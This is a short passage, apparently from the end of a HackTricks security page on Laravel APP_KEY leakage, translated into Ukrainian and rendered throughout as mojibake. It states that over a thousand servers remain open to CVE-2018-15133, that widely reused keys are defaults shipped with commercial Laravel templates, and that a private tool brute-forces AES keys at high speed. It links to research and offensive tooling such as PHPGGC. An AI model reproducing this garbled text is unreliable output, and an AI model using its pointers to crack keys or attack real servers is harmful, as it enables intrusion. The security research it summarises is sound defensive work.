* >1 000 —Å–µ—Ä–≤–µ—Ä—ñ–≤ –≤—Å–µ —â–µ –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ —Å—Ç–∞—Ä–æ–≥–æ CVE-2018-15133, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–æ–∫–µ–Ω–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –º—ñ—Å—Ç—è—Ç—å —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –¥–∞–Ω—ñ.
* –í–µ–ª–∏–∫–µ –ø–æ–≤—Ç–æ—Ä–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–ª—é—á—ñ–≤ ‚Äì –¢–æ–ø-10 APP_KEYs —î –∂–æ—Ä—Å—Ç–∫–æ –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —è–∫—ñ –ø–æ—Å—Ç–∞—á–∞—é—Ç—å—Å—è –∑ –∫–æ–º–µ—Ä—Ü—ñ–π–Ω–∏–º–∏ —à–∞–±–ª–æ–Ω–∞–º–∏ Laravel (UltimatePOS, Invoice Ninja, XPanel, ‚Ä¶).

–ü—Ä–∏–≤–∞—Ç–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Go **nounours** –ø—ñ–¥–≤–∏—â—É—î –ø—Ä–æ–ø—É—Å–∫–Ω—É –∑–¥–∞—Ç–Ω—ñ—Å—Ç—å –±—Ä—É—Ç—Ñ–æ—Ä—Å—É AES-CBC/GCM –¥–æ ~1.5 –º—ñ–ª—å—è—Ä–¥–∞ —Å–ø—Ä–æ–±/—Å, –∑–º–µ–Ω—à—É—é—á–∏ —á–∞—Å –∑–ª–∞–º—É –ø–æ–≤–Ω–æ–≥–æ –Ω–∞–±–æ—Ä—É –¥–∞–Ω–∏—Ö –¥–æ <2 —Ö–≤–∏–ª–∏–Ω.

---

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è
* [Laravel: –∞–Ω–∞–ª—ñ–∑ –≤–∏—Ç–æ–∫—É APP_KEY](https://www.synacktiv.com/publications/laravel-appkey-leakage-analysis.html)
* [laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
* [PHPGGC ‚Äì PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
* [CVE-2018-15133 –æ–ø–∏—Å (WithSecure)](https://labs.withsecure.com/archive/laravel-cookie-forgery-decryption-and-rce)

{{#include ../../banners/hacktricks-training.md}}
